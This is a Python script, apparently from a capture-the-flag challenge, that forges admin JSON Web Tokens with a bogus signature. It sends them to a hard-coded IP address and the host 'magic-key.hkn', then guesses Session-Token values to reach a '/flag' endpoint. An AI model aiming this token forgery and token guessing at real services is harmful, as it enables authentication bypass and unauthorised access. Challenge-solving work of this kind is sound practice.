#!/usr/bin/env python3
import base64, json, requests, time

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def make_jwt(admin, timestamp):
    h = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64url(json.dumps({"admin": admin, "timestamp": timestamp}, separators=(",", ":")).encode())
    return f"{h}.{p}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

MAGIC = "magic-key.hkn"
SECRET = "77.20.124.51"
KEY = "C%{6bSUAs52sI@$K8Ouk0"

# The chronological sequence of "interesting" timestamps we've found
sequence = [
    ("1970 epoch", 0),
    ("1970-01-02 (footer date)", 86400),
    ("2011-03-13 (historical 'accepted')", 1300000000),
    ("2023-12-01 (pcap capture date)", 1701445231),
    ("2033-06-26 (historical 'rejected')", 2003432675),
    ("older than footer date (historical Magnus)", 420),
    ("now", int(time.time())),
]

print("### Sequence 1: sending JWT header to SECRET-SERVER in chronological order, same session ###")
s = requests.Session()
for label, ts in sequence:
    jwt = make_jwt(True, ts)
    r = s.get(f"http://{SECRET}/next_chars", params={"char": "s"}, headers={"JWT": jwt}, timeout=5)
    print(f"  {label} (ts={ts}) -> {r.status_code}: {r.text.strip()[:150]}")
    time.sleep(0.5)

print("\n### After that sequence, immediately try magic-key.hkn /flag with decoy token ###")
r = s.get(f"http://{MAGIC}/flag", headers={"Session-Token": "dGhpcyB0b2tlbiBpcyBub3QgZ29vZA", "URL-Maybe": "/flag"}, timeout=5)
print(f"  -> {r.status_code}: {r.text.strip()[:200]}")

print("\n### Sequence 2: sending JWT header to MAGIC-KEY directly in chronological order, same session ###")
s2 = requests.Session()
for label, ts in sequence:
    jwt = make_jwt(True, ts)
    r = s2.get(f"http://{MAGIC}/next_chars", params={"char": "s"}, headers={"JWT": jwt}, timeout=5)
    print(f"  {label} (ts={ts}) -> {r.status_code}: {r.text.strip()[:150]}")
    time.sleep(0.5)

print("\n### After sequence 2, try /flag on magic-key (same session) ###")
r = s2.get(f"http://{MAGIC}/flag", headers={"Session-Token": "dGhpcyB0b2tlbiBpcyBub3QgZ29vZA", "URL-Maybe": "/flag"}, timeout=5)
print(f"  -> {r.status_code}: {r.text.strip()[:200]}")

print("\n### Sequence 3: Session-Token header values walking through timestamp-derived strings, same session, on magic-key ###")
s3 = requests.Session()
for label, ts in sequence:
    val = str(ts)
    r = s3.get(f"http://{MAGIC}/flag", headers={"Session-Token": val, "URL-Maybe": "/flag"}, timeout=5)
    print(f"  Session-Token={val} ({label}) -> {r.status_code}: {r.text.strip()[:150]}")
    time.sleep(0.5)
